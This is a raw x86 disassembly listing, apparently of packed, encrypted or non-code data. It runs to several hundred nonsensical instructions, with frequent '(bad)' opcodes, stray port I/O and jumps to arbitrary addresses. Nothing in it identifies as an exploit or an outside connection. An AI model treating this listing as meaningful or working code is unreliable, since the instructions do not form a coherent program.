  51a860:	cmp    eax,DWORD PTR [eax-0x11]
  51a863:	mov    edx,0x4d5786ba
  51a868:	jns    0x51a8e4
  51a86a:	pop    ebx
  51a86b:	cwde   
  51a86c:	stos   DWORD PTR es:[edi],eax
  51a86d:	push   esp
  51a86e:	les    esi,FWORD PTR [ecx-0x33]
  51a871:	(bad)  
  51a872:	xchg   ecx,eax
  51a873:	fcmovnb st,st(1)
  51a875:	(bad)  
  51a878:	mov    es:0x4856a29b,eax
  51a87e:	adc    ebx,eax
  51a880:	dec    edi
  51a881:	mov    WORD PTR [ebp-0x3de17948],es
  51a887:	cli    
  51a888:	je     0x51a80d
  51a88a:	ja     0x51a8ba
  51a88c:	cmp    al,0x75
  51a88e:	aam    0x58
  51a890:	popf   
  51a891:	inc    ebx
  51a892:	mov    ds:0x16f49587,eax
  51a897:	dec    ebp
  51a898:	bound  esp,QWORD PTR [edi-0x35]
  51a89b:	out    0x23,eax
  51a89d:	push   esi
  51a89e:	inc    BYTE PTR [ebp+0x38146f22]
  51a8a4:	inc    ebp
  51a8a5:	repz xor al,0x97
  51a8a8:	mov    ecx,tr7
  51a8ab:	adc    ch,BYTE PTR [eax+0x32]
  51a8ae:	xchg   edx,eax
  51a8af:	repz push cs
  51a8b1:	sub    al,0x8d
  51a8b3:	es pop edi
  51a8b5:	dec    ecx
  51a8b6:	cli    
  51a8b7:	repnz ins DWORD PTR es:[edi],dx
  51a8b9:	inc    eax
  51a8ba:	dec    eax
  51a8bb:	and    BYTE PTR [edx],cl
  51a8bd:	lea    edi,[edi+edx*4-0x546edca]
  51a8c4:	enter  0x5fa8,0x57
  51a8c8:	in     al,0xd9
  51a8ca:	xor    eax,0x103b57f4
  51a8cf:	jmp    0x51a87e
  51a8d1:	cs pushf 
  51a8d3:	xchg   esi,eax
  51a8d4:	xor    dl,dh
  51a8d6:	pop    ebp
  51a8d7:	pop    esi
  51a8d8:	sbb    BYTE PTR cs:[edx+0x37],dh
  51a8dc:	cmc    
  51a8dd:	jns    0x51a881
  51a8df:	out    0xfd,al
  51a8e1:	adc    eax,0x1b6da4e1
  51a8e6:	cmc    
  51a8e7:	ret    
  51a8e8:	cmp    al,0xc7
  51a8ea:	mul    DWORD PTR [ecx+0x58]
  51a8ed:	loope  0x51a946
  51a8ef:	xor    eax,0x4841c223
  51a8f4:	ds jp  0x51a962
  51a8f7:	inc    ebx
  51a8f8:	clc    
  51a8f9:	int3   
  51a8fa:	dec    esi
  51a8fb:	xor    eax,0x113eeedb
  51a900:	push   edx
  51a901:	test   eax,0x4cca141b
  51a906:	dec    esi
  51a907:	(bad)  
  51a908:	jge    0x51a8a9
  51a90a:	xchg   ebx,eax
  51a90b:	mov    al,ds:0x6f830529
  51a910:	aas    
  51a911:	lods   eax,DWORD PTR ds:[esi]
  51a912:	push   ds
  51a913:	ins    BYTE PTR es:[edi],dx
  51a914:	lods   al,BYTE PTR ds:[esi]
  51a915:	inc    edx
  51a916:	cmp    edx,DWORD PTR [edi]
  51a918:	sar    BYTE PTR [ebp+esi*8-0xf],cl
  51a91c:	inc    ebx
  51a91d:	mov    bh,0xf8
  51a91f:	(bad)  
  51a920:	test   eax,0xdb891a41
  51a925:	fwait
  51a926:	fs pop eax
  51a928:	imul   ebx,DWORD PTR [esi+0x2e],0x3e
  51a92c:	or     eax,0xc74aef40
  51a931:	cmp    edi,DWORD PTR [eax]
  51a933:	ja     0x51a998
  51a935:	fist   DWORD PTR [ecx]
  51a937:	xchg   edi,eax
  51a938:	je     0x51a9a6
  51a93a:	jbe    0x51a974
  51a93c:	into   
  51a93d:	or     DWORD PTR [edi+0x65eb0166],esp
  51a943:	sub    eax,0xd49772db
  51a948:	mov    bl,0x43
  51a94a:	mov    edx,0x4825f82a
  51a94f:	or     BYTE PTR [eax],0x28
  51a952:	repz push eax
  51a954:	popf   
  51a955:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51a956:	sbb    ebx,DWORD PTR [edx-0x62194099]
  51a95c:	mov    bh,0xcc
  51a95e:	add    al,0x54
  51a960:	or     BYTE PTR [edi],cl
  51a962:	jmp    0x51a901
  51a964:	push   ss
  51a965:	in     eax,0x8f
  51a967:	inc    esi
  51a968:	into   
  51a969:	cmc    
  51a96a:	div    eax
  51a96c:	and    DWORD PTR [edx+0x61],esi
  51a96f:	nop
  51a970:	lds    edx,FWORD PTR [ebx+0x41]
  51a973:	push   ecx
  51a974:	cmp    cl,BYTE PTR [ebp-0x6403fb20]
  51a97a:	pop    ecx
  51a97b:	fiadd  WORD PTR [edi-0x3]
  51a97e:	adc    al,al
  51a980:	jns    0x51a9cd
  51a982:	sub    BYTE PTR [esi-0x22],bh
  51a985:	leave  
  51a986:	shl    DWORD PTR [edi-0x3a],cl
  51a989:	adc    ebx,DWORD PTR [esi+0x12b37e83]
  51a98f:	call   DWORD PTR [edx+0x3a3ba7bc]
  51a995:	cmp    DWORD PTR [eax+0x79a9cdcd],0x716face4
  51a99f:	leave  
  51a9a0:	xor    edi,ecx
  51a9a2:	mov    ecx,0xcca7b7de
  51a9a7:	pusha  
  51a9a8:	pop    edx
  51a9a9:	pop    ds
  51a9aa:	fs jle 0x51a9a4
  51a9ad:	push   edx
  51a9ae:	pop    es
  51a9af:	cmp    bl,bh
  51a9b1:	inc    esi
  51a9b2:	js     0x51a9f1
  51a9b4:	xor    al,0xaa
  51a9b6:	sub    DWORD PTR [esi+0x4],ebx
  51a9b9:	jp     0x51a989
  51a9bb:	cmp    al,0xf0
  51a9bd:	stos   BYTE PTR es:[edi],al
  51a9be:	lods   al,BYTE PTR ds:[esi]
  51a9bf:	xchg   ebp,eax
  51a9c0:	out    dx,al
  51a9c1:	mov    eax,0xe7641980
  51a9c6:	rcl    dl,1
  51a9c8:	in     al,0xa2
  51a9ca:	xchg   esp,eax
  51a9cb:	jp     0x51aa01
  51a9cd:	mov    ds:0x59f85df2,eax
  51a9d2:	mov    al,0xee
  51a9d4:	pop    edi
  51a9d5:	sub    BYTE PTR [ebx],dl
  51a9d7:	(bad)  
  51a9d8:	jmp    0x51aa1a
  51a9da:	sbb    WORD PTR [esi],bx
  51a9dd:	rcr    BYTE PTR [edi-0x70],0xb4
  51a9e1:	and    eax,0xd8dca479
  51a9e6:	mov    ds:0xcba43448,eax
  51a9eb:	shl    BYTE PTR [ebx+ebx*2-0x64],1
  51a9ef:	dec    esp
  51a9f0:	imul   eax,DWORD PTR [edi+0x29],0x6b
  51a9f4:	imul   ebx,DWORD PTR [eax],0xffffffc3
  51a9f7:	cmp    ah,cl
  51a9f9:	out    dx,al
  51a9fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  51a9fb:	mov    edi,0xc68bae17
  51aa00:	inc    ecx
  51aa01:	cli    
  51aa02:	sub    BYTE PTR [eax+edx*8-0x214c183f],ch
  51aa09:	inc    esp
  51aa0a:	scas   eax,DWORD PTR es:[edi]
  51aa0b:	pop    esi
  51aa0c:	dec    ecx
  51aa0d:	in     al,dx
  51aa0e:	test   BYTE PTR [ecx+0x66a7a910],dh
  51aa14:	adc    al,0x58
  51aa16:	cmp    ah,ch
  51aa18:	mov    eax,ds:0x58c64c6b
  51aa1d:	jns    0x51a9b7
  51aa1f:	dec    ebx
  51aa20:	sub    DWORD PTR [ebx-0x709530bc],eax
  51aa26:	xor    ah,dh
  51aa28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51aa29:	adc    eax,0x1c2e6e24
  51aa2e:	cmp    bh,BYTE PTR [bp+si]
  51aa31:	cmp    eax,0xfe4a1353
  51aa36:	(bad)  
  51aa37:	lahf   
  51aa38:	and    ah,BYTE PTR [ebp+esi*4+0x6143831c]
  51aa3f:	shl    DWORD PTR [eax],1
  51aa41:	mov    ds:0xc43f1e78,eax
  51aa46:	fild   WORD PTR [ebp+0x4]
  51aa49:	fs sti 
  51aa4b:	mov    gs,WORD PTR [ebp+0x714a09f3]
  51aa51:	adc    al,0xa3
  51aa53:	cmc    
  51aa54:	dec    edx
  51aa55:	pop    edx
  51aa56:	xlat   BYTE PTR ds:[ebx]
  51aa57:	sub    edx,DWORD PTR [ebp+eiz*2+0x201bfe24]
  51aa5e:	mov    dl,0x8f
  51aa60:	cmp    ch,ah
  51aa62:	scas   eax,DWORD PTR es:[edi]
  51aa63:	ret    0x35c2
  51aa66:	iret   
  51aa67:	enter  0x1a9e,0x82
  51aa6b:	or     BYTE PTR [edx-0x279bc04f],bh
  51aa71:	mov    al,ds:0x4d3241cc
  51aa76:	xor    DWORD PTR [edx+0x64],0xc100ac18
  51aa7d:	mov    es,WORD PTR [ebx+0x7c]
  51aa80:	fcomp  QWORD PTR [eax+0x1b]
  51aa83:	ret    0x37c7
  51aa86:	and    BYTE PTR [edx-0x27],ch
  51aa89:	xlat   BYTE PTR ds:[ebx]
  51aa8a:	mov    eax,0x3a5404af
  51aa8f:	neg    ah
  51aa91:	inc    ebp
  51aa92:	popa   
  51aa93:	cmp    al,0xfc
  51aa95:	dec    ecx
  51aa96:	dec    ebx
  51aa97:	popf   
  51aa98:	cmp    ebx,DWORD PTR [edx-0x16050fab]
  51aa9e:	pop    ss
  51aa9f:	(bad)  
  51aaa0:	jmp    0x8d40b90b
  51aaa5:	sub    BYTE PTR [ebx-0x6b62492f],dl
  51aaab:	push   ss
  51aaac:	fbstp  TBYTE PTR [esi-0x19]
  51aaaf:	xor    eax,0x34a7babb
  51aab4:	call   0xe20:0x4627a2a8
  51aabb:	in     al,dx
  51aabc:	pop    es
  51aabd:	mov    ds:0xdb5bae62,al
  51aac2:	inc    eax
  51aac3:	pushf  
  51aac4:	gs cld 
  51aac6:	and    ebx,DWORD PTR [edi+0x6d]
  51aac9:	adc    esp,DWORD PTR [edi]
  51aacb:	jg     0x51aa87
  51aacd:	push   esp
  51aace:	in     eax,0x7c
  51aad0:	xchg   BYTE PTR [edx],bh
  51aad2:	fidivr WORD PTR [ebx+0x5cfab7b4]
  51aad8:	pushf  
  51aad9:	fsubrp st(3),st
  51aadb:	shr    DWORD PTR [edx+0x56854457],cl
  51aae1:	into   
  51aae2:	and    ch,BYTE PTR ds:0x73469ef8
  51aae8:	sbb    bh,BYTE PTR [ebp-0x34]
  51aaeb:	and    al,0xee
  51aaed:	or     ebp,eax
  51aaef:	popf   
  51aaf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51aaf1:	aad    0xca
  51aaf3:	test   al,0x12
  51aaf5:	push   ss
  51aaf6:	std    
  51aaf7:	sub    DWORD PTR [ebx-0xc],ecx
  51aafa:	push   ds
  51aafb:	retf   0x5e4f
  51aafe:	sbb    DWORD PTR [ebx+0x4a],edi
  51ab01:	sbb    dh,BYTE PTR [eax+0x40]
  51ab04:	xlat   BYTE PTR ds:[ebx]
  51ab05:	lahf   
  51ab06:	pushf  
  51ab07:	sti    
  51ab08:	sahf   
  51ab09:	loop   0x51aae2
  51ab0b:	ret    
  51ab0c:	mov    ecx,0xae774638
  51ab11:	jo     0x51ab10
  51ab13:	aad    0x15
  51ab15:	fsub   QWORD PTR [edx]
  51ab17:	adc    DWORD PTR [edx],esp
  51ab19:	ret    
  51ab1a:	mov    DWORD PTR [ebx+0x1b],0xca712e6
  51ab21:	and    edx,edx
  51ab23:	ret    0x3587
  51ab26:	jno    0x51ab03
  51ab28:	mov    al,ah
  51ab2a:	out    0x58,al
  51ab2c:	jae    0x51aaf4
  51ab2e:	or     al,0x39
  51ab30:	cmp    DWORD PTR [ebx-0x5f],ecx
  51ab33:	mov    ebp,0xaf042aa3
  51ab38:	popa   
  51ab39:	add    al,0xae
  51ab3b:	shl    BYTE PTR [eax-0x65],cl
  51ab3e:	dec    ecx
  51ab3f:	pop    es
  51ab40:	sub    eax,0x10be157c
  51ab45:	push   esp
  51ab46:	out    0xaf,al
  51ab48:	bound  ecx,QWORD PTR [edx+ebx*1-0x21]
  51ab4c:	mul    DWORD PTR [edx-0x5141cb1a]
  51ab52:	das    
  51ab53:	push   ecx
  51ab54:	pop    edi
  51ab55:	inc    edi
  51ab56:	adc    al,0x9e
  51ab58:	(bad)  
  51ab59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  51ab5a:	mov    al,0x4c
  51ab5c:	push   ebx
  51ab5d:	and    esp,esp
  51ab5f:	mov    dl,0xa6
  51ab61:	cwde   
  51ab62:	and    DWORD PTR [ecx],esi
  51ab64:	sar    BYTE PTR [eax],1
  51ab66:	dec    DWORD PTR [esi-0x2b99e7d4]
  51ab6c:	sub    BYTE PTR [ebx],0xef
  51ab6f:	push   ds
  51ab70:	pcmpeqw mm3,QWORD PTR [ebp-0x2c]
  51ab74:	outs   dx,DWORD PTR ds:[esi]
  51ab75:	test   al,0x73
  51ab77:	stos   BYTE PTR es:[edi],al
  51ab78:	jecxz  0x51ab55
  51ab7a:	pushf  
  51ab7b:	stc    
  51ab7c:	call   0xbd7b:0xcedefd4a
  51ab83:	push   ss
  51ab84:	bound  esi,QWORD PTR [eax-0x4f5d76a1]
  51ab8a:	add    eax,0x43302121
  51ab8f:	or     esi,DWORD PTR [ebx+0x789e4ec1]
  51ab95:	cmp    DWORD PTR ds:0x882bce29,esi
  51ab9b:	push   ecx
  51ab9c:	bound  eax,QWORD PTR [esi-0x88ca5d2]
  51aba2:	retf   0x7ab5
  51aba5:	cmp    eax,0x4f87fbb9
  51abaa:	or     DWORD PTR [edi-0x2c],ebp
  51abad:	out    0x22,al
  51abaf:	test   bl,dh
  51abb1:	lds    esp,FWORD PTR ds:0xb1f198bc
  51abb7:	xchg   BYTE PTR [eax+eax*1-0x12a6d24a],bl
  51abbe:	xchg   DWORD PTR [ebx-0x7f],esi
  51abc1:	mov    cl,0xdd
  51abc3:	sub    DWORD PTR [ecx+0x58],esi
  51abc6:	fucomi st,st(3)
  51abc8:	mov    edi,0xf554370d
  51abcd:	mov    al,0x5c
  51abcf:	or     eax,0xbab08563
  51abd4:	nop
  51abd5:	and    DWORD PTR [ecx-0x10],0x31a14fa7
  51abdc:	push   ebp
  51abdd:	adc    dh,BYTE PTR [ebp-0x27]
  51abe0:	push   ds
  51abe1:	iret   
  51abe2:	add    eax,0x29b5c9bf
  51abe7:	sub    DWORD PTR [edx+0x2fc5f340],edx
  51abed:	ss pushf 
  51abef:	inc    BYTE PTR [edx+0x20]
  51abf2:	repnz adc DWORD PTR [edi+0x3f],eax
  51abf6:	dec    ebx
  51abf7:	and    al,0x57
  51abf9:	cmp    al,0xf9
  51abfb:	out    0xee,al
  51abfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  51abfe:	mov    edi,0xfaa5bfba
  51ac03:	mov    edi,0x5d1e3deb
  51ac08:	adc    esi,esi
  51ac0a:	in     al,dx
  51ac0b:	imul   ecx,ebp,0x6395ee5f
  51ac11:	cld    
  51ac12:	jle    0x51ac39
  51ac14:	inc    esp
  51ac15:	sub    BYTE PTR [eax],bh
  51ac17:	gs push eax
  51ac19:	mov    ebp,0x399cad95
  51ac1e:	rol    BYTE PTR [edx],1
  51ac20:	sub    DWORD PTR [edi*1+0x615c66ca],ecx
  51ac27:	lock call FWORD PTR [ecx+0x61]
  51ac2b:	hlt    
  51ac2c:	mov    bh,0x5a
  51ac2e:	xchg   DWORD PTR [eax+0x13],ecx
  51ac31:	inc    edi
  51ac32:	retf   0xafb4
  51ac35:	(bad)  
  51ac36:	jnp    0x51ac2c
  51ac38:	mov    bh,0xf0
  51ac3a:	out    0x14,eax
  51ac3c:	sbb    eax,0x6b58b9b9
  51ac41:	mov    cl,BYTE PTR [esi-0x490347c3]
  51ac47:	xchg   edx,eax
  51ac48:	dec    BYTE PTR [edx-0x7a]
  51ac4b:	test   DWORD PTR [esi-0xd],eax
  51ac4e:	xchg   edi,eax
  51ac4f:	bound  ebx,QWORD PTR [esi]
  51ac51:	push   0x20f92e07
  51ac56:	sub    al,0xbf
  51ac58:	cwde   
  51ac59:	in     al,dx
  51ac5a:	dec    eax
  51ac5b:	sti    
  51ac5c:	jmp    0xacb43694
  51ac61:	jecxz  0x51ac17
  51ac63:	sbb    DWORD PTR [edi-0x615133bd],edi
  51ac69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51ac6a:	jg     0x51ace4
  51ac6c:	mov    eax,ds:0x299a4d36
  51ac71:	hlt    
  51ac72:	adc    esi,DWORD PTR [ebp+0x44059f5b]
  51ac78:	adc    BYTE PTR [ebx],dh
  51ac7a:	mov    ah,0x78
  51ac7c:	sub    BYTE PTR ds:0x387c28fc,0x50
  51ac83:	xchg   BYTE PTR [edi+0x66],cl
  51ac86:	sub    al,0x60
  51ac88:	mov    al,0xad
  51ac8a:	push   0x5f40ae72
  51ac8f:	jl     0x51ac58
  51ac91:	jno    0x51acb8
  51ac93:	add    cl,BYTE PTR es:[eax-0x73]
  51ac97:	sbb    DWORD PTR [ebx-0x39],eax
  51ac9a:	fnsave [ebx-0x22f97482]
  51aca0:	xor    al,0x54
  51aca2:	ret    0x7125
  51aca5:	add    eax,0x15c2682c
  51acaa:	pop    ebx
  51acab:	xchg   ebx,eax
  51acac:	mov    ebx,0x79f3391d
  51acb1:	sub    BYTE PTR [edx+eax*8],bh
  51acb4:	div    BYTE PTR [eax+0x2f23e870]
  51acba:	fnstsw WORD PTR [edx-0x1a]
  51acbd:	xchg   BYTE PTR [ebx+0x51ab07ec],dl
  51acc3:	mov    al,BYTE PTR [edx]
  51acc5:	push   edi
  51acc6:	popa   
  51acc7:	xchg   ecx,eax
  51acc8:	add    eax,0xc5d5067a
  51accd:	fs jg  0x51acbe
  51acd0:	dec    edi
  51acd1:	mov    esi,0xaad4fe02
  51acd6:	(bad)  
  51acd7:	pop    DWORD PTR [edx+ebx*2+0x79]
  51acdb:	and    al,0x30
  51acdd:	aad    0xc2
  51acdf:	xchg   edi,eax
  51ace0:	jns    0x51ad32
  51ace2:	push   esi
  51ace3:	mov    esi,DWORD PTR [eax-0x18104ad]
  51ace9:	aad    0x40
  51aceb:	test   DWORD PTR [esi+esi*8-0x14],edx
  51acef:	das    
  51acf0:	dec    esi
  51acf1:	out    0x2e,al
  51acf3:	xor    DWORD PTR [eax],ebx
  51acf5:	rcr    ah,1
  51acf7:	fsub   DWORD PTR [edi+0x7b]
  51acfa:	loop   0x51acb8
  51acfc:	mov    ebx,DWORD PTR ds:0xb133a0b1
  51ad02:	add    eax,0x3290a887
  51ad07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51ad08:	or     eax,0x5120c08b
  51ad0d:	pop    ebx
  51ad0e:	call   0xaf8209d9
  51ad13:	adc    BYTE PTR [edi],bl
  51ad15:	mov    edx,0x78bd7ce0
  51ad1a:	aad    0xa
  51ad1c:	mov    al,0x64
  51ad1e:	test   eax,0x6a536c28
  51ad23:	jg     0x51ad2d
  51ad25:	ss into 
  51ad27:	ins    BYTE PTR es:[edi],dx
  51ad28:	daa    
  51ad29:	data16 or BYTE PTR [edi],0xd0
  51ad2d:	xchg   edi,eax
  51ad2e:	mov    dh,0x53
  51ad30:	push   ss
  51ad31:	leave  
  51ad32:	push   edi
  51ad33:	mov    dh,0xcc
  51ad35:	test   eax,0xabeee8c3
  51ad3a:	pushw  cs
  51ad3c:	add    ecx,DWORD PTR [ebx+0x157ebfb2]
  51ad42:	out    dx,eax
  51ad43:	fcom   QWORD PTR [edi]
  51ad45:	sar    BYTE PTR [eax-0x41],0xa8
  51ad49:	push   0x63
  51ad4b:	inc    esp
  51ad4c:	pop    es
  51ad4d:	sbb    DWORD PTR [ebp-0x7d],edi
  51ad50:	nop
  51ad51:	inc    esp
  51ad52:	out    dx,al
  51ad53:	mov    eax,ds:0xbb14899
  51ad58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  51ad59:	sub    cl,al
  51ad5b:	adc    BYTE PTR [edx+0x3],dl
  51ad5e:	adc    al,0x5e
  51ad60:	pop    ss
  51ad61:	mov    BYTE PTR [esi-0x24595d76],dl
  51ad67:	jmp    0xc076cf5a
  51ad6c:	cdq    
  51ad6d:	out    dx,eax
  51ad6e:	cdq    
  51ad6f:	ret    0x28b4
  51ad72:	ja     0x51addd
  51ad74:	jecxz  0x51ad41
  51ad76:	xchg   edi,eax
  51ad77:	add    eax,0x8c67a6ef
  51ad7c:	xor    DWORD PTR [ebp-0x4e25825a],ebp
  51ad82:	fwait
  51ad83:	pop    esp
  51ad84:	jle    0x51adc2
  51ad86:	inc    DWORD PTR [edx-0x3a041f28]
  51ad8c:	inc    eax
  51ad8d:	pop    es
  51ad8e:	in     al,dx
  51ad8f:	ret    
  51ad90:	adc    esp,edx
  51ad92:	dec    ebp
  51ad93:	(bad)  
  51ad94:	cwde   
  51ad95:	sbb    BYTE PTR [esi-0x2c],ch
  51ad98:	mov    bl,0x51
  51ad9a:	out    0xdf,eax
  51ad9c:	mov    al,0xd8
  51ad9e:	mov    ebp,0x41834fb
  51ada3:	push   esp
  51ada4:	mov    ebp,0xaf1eec2e
  51ada9:	or     eax,edi
  51adab:	adc    al,0x10
  51adad:	cmp    al,0x66
  51adaf:	xchg   edi,eax
  51adb0:	stc    
  51adb1:	xchg   BYTE PTR [ecx-0x73],bl
  51adb4:	and    ecx,DWORD PTR [eax-0x1a]
  51adb7:	neg    BYTE PTR [ebp+0xd23c147]
  51adbd:	pop    esi
  51adbe:	in     al,0x24
  51adc0:	jno    0x51ad56
  51adc2:	push   esp
  51adc3:	pop    eax
  51adc4:	add    ah,bl
  51adc6:	lock out 0xc2,eax
  51adc9:	mov    ds:0x8a804ba4,al
  51adce:	enter  0x95ed,0x81
  51add2:	or     ebp,ecx
  51add4:	pop    esi
  51add5:	add    al,0xaa
  51add7:	adc    DWORD PTR [edx+eiz*1+0x2d0bfcf9],0xae819332
  51ade2:	ret    
  51ade3:	adc    dh,BYTE PTR [edi-0x5e]
  51ade6:	shr    ecx,cl
  51ade8:	push   edi
  51ade9:	scas   eax,DWORD PTR es:[edi]
  51adea:	bound  ebp,QWORD PTR [ebp+0x49]
  51aded:	pop    ss
  51adee:	out    dx,al
  51adef:	mov    edx,ds
  51adf1:	jb     0x51ae1d
  51adf3:	cwde   
  51adf4:	xchg   BYTE PTR [ecx+0x7e],bl
  51adf7:	mov    WORD PTR [edx],ds
  51adf9:	dec    esi
  51adfa:	out    dx,eax
  51adfb:	or     DWORD PTR [edi],eax
  51adfd:	jo     0x51ae52
  51adff:	cli    
  51ae00:	xchg   edx,eax
  51ae01:	sahf   
  51ae02:	mov    ecx,cs
  51ae04:	jno    0x51ad9c
  51ae06:	fdivr  DWORD PTR [ebx+0x5e]
  51ae09:	add    eax,0xcb522734
  51ae0e:	mov    ah,0xd3
  51ae10:	dec    esi
  51ae11:	pop    ebp
  51ae12:	shl    DWORD PTR [eax-0x3a],0x27
  51ae16:	add    al,0x12
  51ae18:	lods   al,BYTE PTR ds:[esi]
  51ae19:	dec    esp
  51ae1a:	push   es
  51ae1b:	sub    dl,BYTE PTR [edx]
  51ae1d:	aad    0x55
  51ae1f:	retf   0x767d
  51ae22:	mov    esi,0xb2ee70dc
  51ae27:	rcr    edx,0xcf
  51ae2a:	std    
  51ae2b:	push   ds
  51ae2c:	jecxz  0x51adbf
  51ae2e:	xchg   ecx,eax
  51ae2f:	push   esi
  51ae30:	adc    al,0x6a
  51ae32:	push   ebp
  51ae33:	hlt    
  51ae34:	cmp    al,0x2a
  51ae36:	aaa    
  51ae37:	push   esp
  51ae38:	cmp    ah,BYTE PTR [esi]
  51ae3a:	jp     0x51add1
  51ae3c:	push   cs
  51ae3d:	(bad)  
  51ae3e:	adc    esi,edx
  51ae40:	push   edx
  51ae41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51ae42:	xor    eax,edi
  51ae44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  51ae45:	mov    esp,0x5149f648
  51ae4a:	cmp    ebp,eax
  51ae4c:	jb     0x51ae83
  51ae4e:	fiadd  DWORD PTR [eax+0x1baf106f]
  51ae54:	nop
  51ae55:	das    
  51ae56:	push   esp
  51ae57:	fsubr  st(6),st
  51ae59:	mov    ebp,0x5ddd0b67
  51ae5e:	bnd jmp 0xef936261
  51ae64:	jmp    0x51aebf
  51ae66:	clc    
  51ae67:	mov    ah,0x9a
  51ae69:	jle    0x51ae97
  51ae6b:	lods   al,BYTE PTR ds:[esi]
  51ae6c:	push   edi
  51ae6d:	cdq    
  51ae6e:	fisubr DWORD PTR [ebp-0x4f]
  51ae71:	ins    DWORD PTR es:[edi],dx
  51ae72:	dec    esp
  51ae73:	sub    DWORD PTR [edi-0x4c],0xffffff8e
  51ae77:	aaa    
  51ae78:	test   esi,esp
  51ae7a:	ret    0xba0b
  51ae7d:	mov    al,0xd0
  51ae7f:	push   ss
  51ae80:	ret    0x3475
  51ae83:	add    edi,ebp
  51ae85:	mov    edx,0xa0a68ea8
  51ae8a:	int    0x4c
  51ae8c:	fwait
  51ae8d:	xchg   edx,eax
  51ae8e:	hlt    
  51ae8f:	call   0xb011:0x7b0e2913
  51ae96:	mov    ds:0x95ae24bc,al
  51ae9b:	mov    edi,edx
  51ae9d:	je     0x51aec4
  51ae9f:	mov    dl,0x33
  51aea1:	cmc    
  51aea2:	and    ecx,DWORD PTR [ecx+0x35]
  51aea5:	mov    ss,WORD PTR [ebx]
  51aea7:	and    ch,bh
  51aea9:	cmc    
  51aeaa:	(bad)  
  51aeab:	shr    DWORD PTR [edi-0x39],cl
  51aeae:	fcom   QWORD PTR [eax+0x1970839c]
  51aeb4:	xchg   esp,eax
  51aeb5:	gs xchg ebp,eax
  51aeb7:	jl     0x51ae8a
  51aeb9:	mov    dh,0x7
  51aebb:	pandn  mm3,QWORD PTR [edx-0xb673b72]
  51aec2:	cmp    al,0x1d
  51aec4:	jo     0x51aec9
  51aec6:	ja     0x51ae87
  51aec8:	push   ss
  51aec9:	fldenv ds:0x2972a233
  51aecf:	into   
  51aed0:	mov    ecx,0x56153554
  51aed5:	imul   edi,DWORD PTR [edi-0x40],0xbe2e7038
  51aedc:	add    dh,BYTE PTR [edi]
  51aede:	xchg   edx,eax
  51aedf:	test   cl,bl
  51aee1:	aam    0xfe
  51aee3:	xchg   ebx,eax
  51aee4:	or     DWORD PTR [ebp+0x61],ecx
  51aee7:	lahf   
  51aee8:	xor    BYTE PTR [esi+0x8],dl
  51aeeb:	(bad)  
  51aeec:	pop    edi
  51aeed:	xor    DWORD PTR [ebx],0x7a
  51aef0:	sub    edx,edx
  51aef2:	scas   al,BYTE PTR es:[edi]
  51aef3:	(bad)  
  51aef4:	xor    BYTE PTR [edx],cl
  51aef6:	jae    0x51af72
  51aef8:	adc    eax,0x71c4e2fe
  51aefd:	inc    esi
  51aefe:	stos   BYTE PTR es:[edi],al
  51aeff:	mov    ah,0xde
  51af01:	in     eax,dx
  51af02:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  51af04:	dec    edx
  51af05:	mov    eax,DWORD PTR [edi-0x5f]
  51af08:	adc    ecx,DWORD PTR [edi-0x29d2e8fc]
  51af0e:	clc    
  51af0f:	sbb    esi,DWORD PTR [eax+esi*4+0x6f]
  51af13:	into   
  51af14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  51af15:	jle    0x51aeab
  51af17:	aad    0xe
  51af19:	cdq    
  51af1a:	cmp    BYTE PTR [esi-0x8],dh
  51af1d:	mov    bl,BYTE PTR [ecx]
  51af1f:	frstor [eax]
  51af21:	cld    
  51af22:	mov    dl,0xb3
  51af24:	inc    eax
  51af25:	cmp    eax,0x9e5ac3da
  51af2a:	lea    edx,[edi+0x581d7125]
  51af30:	or     ebx,DWORD PTR [ebx+0x3da022c9]
  51af36:	out    dx,eax
  51af37:	add    dh,BYTE PTR [ebp+0x2a908ef0]
  51af3d:	shl    BYTE PTR [ebx],0xa1
  51af40:	or     bl,BYTE PTR [ebx-0x449dd01a]
  51af46:	inc    esi
  51af47:	add    eax,0xe47ce583
  51af4c:	fst    DWORD PTR [ebp-0x4f]
  51af4f:	out    0xf1,eax
  51af51:	inc    esp
  51af52:	mov    dl,0xdd
  51af54:	mov    BYTE PTR [edx+0x35],0x74
  51af58:	cmc    
  51af59:	scas   al,BYTE PTR es:[edi]
  51af5a:	push   ebp
  51af5b:	mov    ds:0xdd2283dd,eax
  51af60:	pop    ebx
  51af61:	xor    DWORD PTR [ecx+0x2a1755fe],esi
  51af67:	(bad)  
  51af68:	pop    esi
  51af69:	loope  0x51afb7
  51af6b:	mov    DWORD PTR [esi-0x23dcceff],esp
  51af71:	mov    ?,WORD PTR [ebp+0x32c8364c]
  51af77:	js     0x51af9f
  51af79:	dec    ebp
  51af7a:	test   ebx,0x76970def
  51af80:	cmp    edi,DWORD PTR [ebp-0x3b]
  51af83:	sahf   
  51af84:	fs push ds
  51af86:	daa    
  51af87:	pop    edi
  51af88:	out    dx,al
  51af89:	ret    0x951b
  51af8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  51af8d:	data16 test ch,0xf
  51af91:	neg    edi
  51af93:	retf   0x7e6d
  51af96:	shr    DWORD PTR [edi-0x29c6364b],cl
  51af9c:	sub    BYTE PTR [esi+ebp*4+0x72],0x9e
  51afa1:	pop    esi
  51afa2:	int    0x70
  51afa4:	js     0x51af2d
  51afa6:	pusha  
  51afa7:	xor    edi,DWORD PTR [edx-0x39ee4159]
  51afad:	stos   BYTE PTR es:[edi],al
  51afae:	mov    eax,DWORD PTR [ebx]
  51afb0:	fs adc eax,0xce1682cf
  51afb6:	repz and BYTE PTR [edx],cl
  51afb9:	test   eax,0xd1f7be8e
  51afbe:	(bad)  
  51afbf:	leave  
  51afc0:	in     eax,dx
